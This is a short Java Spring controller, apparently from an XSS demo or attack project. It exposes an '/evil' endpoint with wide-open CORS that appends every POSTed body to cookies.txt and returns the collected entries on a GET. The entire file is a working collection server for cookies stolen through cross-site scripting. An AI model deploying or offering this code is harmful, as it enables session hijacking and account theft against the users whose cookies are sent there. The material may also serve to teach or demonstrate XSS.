package ru.hacker.xss;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/evil")
@CrossOrigin(origins = "*")
public class XssController {

  @PostMapping
  public void writeCokies(@RequestBody String body) {
    try (var output = new BufferedWriter(new FileWriter("cookies.txt", true))) {
      output.write(body);
      output.newLine();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  @GetMapping
  public String readCookies() {
    try (var input = new BufferedReader(new FileReader("cookies.txt"))) {
      StringBuilder builder = new StringBuilder();
      while (input.ready()) {
        String line = input.readLine();
        builder.append(line);
        builder.append("\n");
      }
      return builder.toString();
    } catch (IOException e) {
      e.printStackTrace();
      return "error";
    }
  }
}
